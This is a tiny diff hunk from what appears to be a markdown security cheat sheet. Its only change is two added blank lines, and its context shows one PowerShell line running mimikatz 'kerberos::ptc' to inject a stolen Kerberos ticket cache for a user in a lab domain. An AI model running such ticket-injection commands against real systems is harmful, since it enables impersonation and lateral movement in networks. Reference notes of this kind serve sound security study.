@@ -14,3 +14,5 @@ updated_at: '2023-04-10T20:36:13.637880+00:00'
 ```powershell
 mimikatz.exe "kerberos::ptc c:\temp\TGT_darthsidious@lab.adsecurity.org.ccache"
 ```
+
+
